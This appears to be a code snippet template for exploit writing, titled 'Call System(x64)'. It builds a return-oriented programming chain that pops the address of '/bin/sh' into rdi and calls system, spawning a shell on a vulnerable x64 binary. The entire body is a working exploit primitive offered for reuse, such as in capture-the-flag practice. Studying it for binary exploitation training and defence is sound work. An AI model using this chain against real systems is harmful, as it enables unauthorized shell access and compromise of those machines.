# HEADER
# name: Call System(x64)
# prefix: rop-call-system-x64
# description: system("/bin/sh")
# author: keymoon

# VARIABLES
# _rop: rop
# _bin: bin

# BODY
_rop += p64(next(_bin.gadget("pop rdi; ret;")))
_rop += p64(next(_bin.search(b"/bin/sh\x00")))
_rop += p64(_bin.symbol("system"))
